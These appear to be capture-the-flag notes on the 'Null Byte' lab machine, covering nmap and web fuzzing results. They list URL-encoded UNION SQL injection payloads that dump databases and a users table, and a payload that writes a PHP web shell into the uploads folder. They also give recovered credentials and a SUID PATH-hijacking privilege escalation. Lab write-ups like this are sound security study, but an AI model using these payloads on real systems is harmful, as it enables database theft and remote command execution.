# Export
```md
export IP="192.168.136.16"
export URL="http://192.168.136.16/FUZZ"
```

<hr>

# Loot
+ Vulnerable to SQL Injection
+ Payload: `http://192.168.237.16/kzMb5nVYJw/420search.php?usrtosearch=%22`
+ Valid local users: `eric` , `bob` (through SQL injection)
+ `/var/www/html/uploads` is writable 

#### SQL Injection
+ Current database: `seth`
```md
payload> %22+UNION+SELECT+null%2Cdatabase%28%29%2Cnull%23
```

+ Current version: `5.5.44-0+deb8u1`
```md
payload> %22+UNION+SELECT+null%2C%40%40version%2Cnull%23
```

+ Databases: `seth`,`mysql` and `phpmyadmin`

```md
payload> %22+UNION+SELECT+null%2Cschema_name%2Cnull+FROM+information_schema.schemata%23
```

+ Tables: `users`
```md
payload> %22+UNION+SELECT+null%2Ctable_schema%2Ctable_name+FROM+information_schema.tables+WHERE+table_schema+%21%3D+%22my_sql%22+AND+table_schema+%21%3D+%22information_schema%22%23
```

+ Columns: `id`, `user`, `pass`

```md
payload> %22+UNION+SELECT+id%2Cuser%2Cpass+from+users%23
```

+ Getting Shell:
```md
payload> %22+UNION+ALL+SELECT+null%2C%22%3C%3Fphp+system%28%24_GET%5Bc%5D%29%3F%3E%22%2Cnull+INTO+OUTFILE+%22%2Fvar%2Fwww%2Fhtml%2Fuploads%2Fshell15.php%22%23
```

#### Crendentials
+ (Web): `key=elite`
+ (Mysql): `ramses:omega`

#### Local Enumeration
+ SUID `procwatch` + PATH Hijacking → `root` privilege

<hr>

# Nmap
```bash
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))           
| http-methods:                      
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33323/udp   status
|   100024  1          33872/tcp   status
|   100024  1          43582/udp6  status
|_  100024  1          57223/tcp6  status
777/tcp   open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
33872/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
```

<hr>

# Web Application
#### Port 80
+ Discovery

```bash
.htaccess               [Status: 403, Size: 298, Words: 22, Lines: 12]
.hta                    [Status: 403, Size: 293, Words: 22, Lines: 12]
.htpasswd               [Status: 403, Size: 298, Words: 22, Lines: 12]
index.html              [Status: 200, Size: 196, Words: 20, Lines: 11]
javascript              [Status: 301, Size: 321, Words: 20, Lines: 10]
phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 302, Words: 22, Lines: 12]
uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10]
```

+ `exiftool` the `gif` reveals hidden path. `/kzMb5nVYJw`
+ Navigate to the new path.

```html
<!-- this form isn't connected to mysql, password ain't that complex --!>
```

<hr>

# SSH
#### Port 777
+ Version 6.7p1 → User Enumeration ?
